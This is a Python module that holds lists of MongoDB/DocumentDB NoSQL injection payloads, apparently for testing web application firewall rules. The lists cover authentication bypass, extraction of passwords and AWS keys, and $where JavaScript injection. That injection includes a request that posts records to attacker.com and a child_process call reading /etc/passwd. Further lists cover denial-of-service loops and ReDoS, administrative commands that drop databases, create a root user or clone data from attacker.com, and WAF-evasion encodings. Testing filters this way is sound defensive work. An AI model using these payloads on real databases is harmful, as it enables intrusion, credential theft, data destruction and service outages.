#!/usr/bin/env python3
"""
DocumentDB/MongoDB Attack Vectors

This module contains attack vectors that are specific to DocumentDB and MongoDB,
focusing on NoSQL injection and other MongoDB-specific vulnerabilities.
"""

class DocumentDBVectors:
    """DocumentDB/MongoDB attack vectors for testing WAF rules."""
    
    # Basic NoSQL injection patterns for MongoDB
    BASIC = [
        # Basic syntax
        "{ \"username\": \"admin\" }",
        "{ \"username\": { \"$ne\": null } }",
        "{ \"username\": { \"$gt\": \"\" } }",
        "{ \"username\": { \"$exists\": true } }",
        "{ \"username\": \"admin\", \"password\": { \"$ne\": \"\" } }",
        "{ \"$where\": \"this.password == 'password'\" }",
        "{ \"$where\": \"this.username == 'admin'\" }",
        
        # Query selectors
        "{ field: { $eq: \"value\" } }",
        "{ field: { $gt: 100 } }",
        "{ field: { $gte: 100 } }",
        "{ field: { $lt: 100 } }",
        "{ field: { $lte: 100 } }",
        "{ field: { $ne: \"value\" } }",
        "{ field: { $in: [\"value1\", \"value2\"] } }",
        "{ field: { $nin: [\"value1\", \"value2\"] } }",
        
        # Logical operators
        "{ $and: [ { field1: \"value1\" }, { field2: \"value2\" } ] }",
        "{ $or: [ { field1: \"value1\" }, { field2: \"value2\" } ] }",
        "{ $nor: [ { field1: \"value1\" }, { field2: \"value2\" } ] }",
        "{ field: { $not: { $eq: \"value\" } } }",
        
        # Element operators
        "{ field: { $exists: true } }",
        "{ field: { $type: \"string\" } }",
        "{ field: { $type: 2 } }" # 2 is the BSON code for string
    ]
    
    # Authentication bypass
    AUTH_BYPASS = [
        # Login bypass
        "{ \"username\": { \"$ne\": \"invalid\" } }",
        "{ \"username\": \"admin\", \"password\": { \"$ne\": \"\" } }",
        "{ \"username\": { \"$in\": [\"admin\", \"root\", \"superuser\"] } }",
        "{ \"username\": \"admin\", \"$where\": \"this.password.length > 0\" }",
        
        # Regex-based auth bypass
        "{ \"username\": { \"$regex\": \"^admin\" } }",
        "{ \"username\": \"admin\", \"password\": { \"$regex\": \".*\" } }",
        "{ \"username\": { \"$regex\": \"admin\", \"$options\": \"i\" } }",
        
        # Comparison operators for bypass
        "{ \"username\": \"admin\", \"password\": { \"$gt\": \"\" } }",
        "{ \"username\": \"admin\", \"password\": { \"$ne\": null } }",
        "{ \"username\": \"admin\", \"password\": { \"$exists\": true } }",
        
        # OR conditions
        "{ \"$or\": [ { \"username\": \"admin\" }, { \"admin\": true } ] }",
        "{ \"$or\": [ { \"username\": \"admin\" }, { \"username\": \"administrator\" } ] }",
        "{ \"$or\": [ { \"password\": { \"$regex\": \".*\" } }, { \"password\": { \"$exists\": false } } ] }",
        
        # Array operations
        "{ \"roles\": { \"$elemMatch\": { \"$eq\": \"admin\" } } }",
        "{ \"permissions\": { \"$all\": [\"read\", \"write\", \"admin\"] } }"
    ]
    
    # Data extraction 
    EXTRACTION = [
        # Projection manipulation
        "{ \"username\": \"admin\" }, { \"password\": 1 }",
        "{}, { \"username\": 1, \"password\": 1, \"_id\": 0 }",
        "{}, { \"credentials.aws_key\": 1, \"credentials.aws_secret\": 1 }",
        
        # Using $where for data extraction
        "{ \"$where\": \"this.password && emit(this.password)\" }",
        "{ \"$where\": \"this.credit_card && emit(this.credit_card)\" }",
        
        # Aggregation for data extraction
        "{ \"$group\": { \"_id\": null, \"data\": { \"$push\": \"$password\" } } }",
        "{ \"$group\": { \"_id\": null, \"data\": { \"$push\": { \"user\": \"$username\", \"pass\": \"$password\" } } } }",
        
        # Map-reduce for data extraction
        "{ \"mapreduce\": \"users\", \"map\": \"function() { emit(this._id, this.password); }\" }",
        
        # Using $lookup for data extraction (MongoDB 3.2+)
        "{ \"$lookup\": { \"from\": \"users\", \"localField\": \"user_id\", \"foreignField\": \"_id\", \"as\": \"user_data\" } }",
        
        # Nested field extraction
        "{ \"nested.field\": { \"$exists\": true } }, { \"nested.field\": 1 }"
    ]
    
    # JavaScript injection via MongoDB operators
    JS_INJECTION = [
        # Basic JavaScript injection
        "{ \"$where\": \"return true\" }",
        "{ \"$where\": \"sleep(10000)\" }",
        "{ \"$where\": \"while(true){}\" }",
        
        # Data exfiltration via JavaScript
        "{ \"$where\": \"function() { return Object.keys(this).join(','); }\" }",
        "{ \"$where\": \"function() { return JSON.stringify(this); }\" }",
        "{ \"$where\": \"function() { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://attacker.com/steal', false); xhr.send(JSON.stringify(this)); return true; }\" }",
        
        # Command execution attempts
        "{ \"$where\": \"function() { return process.env; }\" }",
        "{ \"$where\": \"function() { require('child_process').exec('cat /etc/passwd'); return true; }\" }",
        "{ \"$where\": \"function() { return process.mainModule.require('fs').readdirSync('.'); }\" }",
        
        # JavaScript in other contexts
        "{ \"$expr\": { \"$function\": { \"body\": \"function() { while(true) { } return true; }\", \"args\": [], \"lang\": \"js\" } } }",
        "{ \"mapReduce\": \"collection\", \"map\": \"function() { emit(process.env, null); }\" }",
        
        # Prototype pollution
        "{ \"$where\": \"function() { Object.prototype.isAdmin = true; return true; }\" }",
        "{ \"$where\": \"function() { this.constructor.prototype.isAdmin = true; return true; }\" }"
    ]
    
    # MongoDB operator abuse
    OPERATOR_ABUSE = [
        # Abusing $regex for performance issues
        "{ \"username\": { \"$regex\": \".*a.*b.*c.*d.*e.*f.*g.*h.*i.*j.*\" } }",
        "{ \"username\": { \"$regex\": \"(a+)+b\" } }", # ReDoS
        "{ \"username\": { \"$regex\": \"^([a-zA-Z0-9])\\\\1{100}\" } }",
        
        # Abusing $where for DoS
        "{ \"$where\": \"function() { for(var i=0; i<1000000; i++) {} return true; }\" }",
        "{ \"$where\": \"function() { var d = new Date(); while(new Date() - d < 10000) {} return true; }\" }",
        
        # Abusing array operators
        "{ \"array\": { \"$all\": [ /* large array with thousands of items */ ] } }",
        "{ \"array\": { \"$elemMatch\": { \"$where\": \"function() { while(true) {} }\" } } }",
        
        # Abusing comparison operators
        "{ \"field\": { \"$gt\": { \"$where\": \"function() { while(true) {} }\" } } }",
        
        # Abusing aggregation operators
        "{ \"$group\": { \"_id\": null, \"result\": { \"$push\": \"$$ROOT\" } } }", # Memory exhaustion
        "{ \"$group\": { \"_id\": { \"$substr\": [\"$field\", 0, 10000000] } } }" # CPU exhaustion
    ]
    
    # MongoDB-specific command injection
    COMMAND_INJECTION = [
        # Direct command execution attempts
        "{ \"eval\": \"db.users.find({}).forEach(function(u) { print(u.password); })\" }",
        "{ \"$eval\": \"db.getCollectionNames()\" }",
        "{ \"$eval\": \"db.users.drop()\" }",
        
        # Using system.js collection (older MongoDB)
        "{ \"$where\": \"function() { return db.system.js.findOne({_id: 'backdoor'}); }\" }",
        
        # Administrative commands
        "{ \"shutdown\": 1 }",
        "{ \"listDatabases\": 1 }",
        "{ \"dropDatabase\": 1 }",
        "{ \"cloneCollection\": \"users\", \"from\": \"mongodb://attacker.com:27017/\" }",
        
        # Database user manipulation
        "{ \"createUser\": { \"user\": \"hacker\", \"pwd\": \"password\", \"roles\": [ \"root\" ] } }",
        "{ \"updateUser\": \"admin\", \"pwd\": \"newpassword\" }",
        "{ \"grantRolesToUser\": \"existing_user\", \"roles\": [ \"root\" ] }",
        
        # Configuration attacks
        "{ \"getParameter\": \"*\" }",
        "{ \"setParameter\": { \"logLevel\": 0 } }"
    ]
    
    # WAF bypass techniques for NoSQL injections
    WAF_BYPASS = [
        # Double encoding
        "{ \"username\": { \"%24regex\": \"admin\" } }",
        "{ \"%24where\": \"this.password == 'password'\" }",
        
        # JSON structure variation
        "{{\"username\":\"admin\"}}",
        "{\"username\":{\"$ne\":null},}",
        "{\"username\"/*comment*/:/*comment*/\"admin\"}",
        
        # Alternative syntax
        "{ \"username\": { \"$nin\": [] } }", # Equivalent to { "$ne": null }
        "{ \"$expr\": { \"$eq\": [ \"$username\", \"admin\" ] } }",
        
        # HTTP parameter pollution
        "username[$ne]=&username=admin", # URL parameter
        
        # Content-type manipulation
        "Content-Type: application/x-www-form-urlencoded", # Instead of application/json
        
        # Using arrays in unexpected places
        "{ \"username\": [{ \"$ne\": null }] }",
        
        # Character encoding tricks
        "{ \"username\": { \"\\u0024ne\": null } }",
        "{ \"\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\": \"admin\" }",
        
        # Null byte injection
        "{ \"username\\u0000\": \"admin\" }",
        "{ \"$where\\u0000\": \"this.password = 'password'\" }",
        
        # Whitespace variation
        "{\"username\":{\"$ne\":null}}",
        "{\n\"username\"\n:\n{\n\"$ne\"\n:\nnull\n}\n}",
        
        # Using dots in keys
        "{ \"user.name\": \"admin\" }",
        "{ \"user\": { \"name\": \"admin\" } }" # Equivalent to above in MongoDB
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all DocumentDB/MongoDB vectors."""
        return (
            cls.BASIC +
            cls.AUTH_BYPASS +
            cls.EXTRACTION +
            cls.JS_INJECTION +
            cls.OPERATOR_ABUSE +
            cls.COMMAND_INJECTION +
            cls.WAF_BYPASS
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic DocumentDB/MongoDB vectors."""
        return cls.BASIC
    
    @classmethod
    def auth_bypass(cls) -> list:
        """Return authentication bypass DocumentDB/MongoDB vectors."""
        return cls.AUTH_BYPASS
    
    @classmethod
    def extraction(cls) -> list:
        """Return data extraction DocumentDB/MongoDB vectors."""
        return cls.EXTRACTION
    
    @classmethod
    def js_injection(cls) -> list:
        """Return JavaScript injection DocumentDB/MongoDB vectors."""
        return cls.JS_INJECTION
    
    @classmethod
    def operator_abuse(cls) -> list:
        """Return operator abuse DocumentDB/MongoDB vectors."""
        return cls.OPERATOR_ABUSE
    
    @classmethod
    def command_injection(cls) -> list:
        """Return command injection DocumentDB/MongoDB vectors."""
        return cls.COMMAND_INJECTION
    
    @classmethod
    def waf_bypass(cls) -> list:
        """Return WAF bypass DocumentDB/MongoDB vectors."""
        return cls.WAF_BYPASS 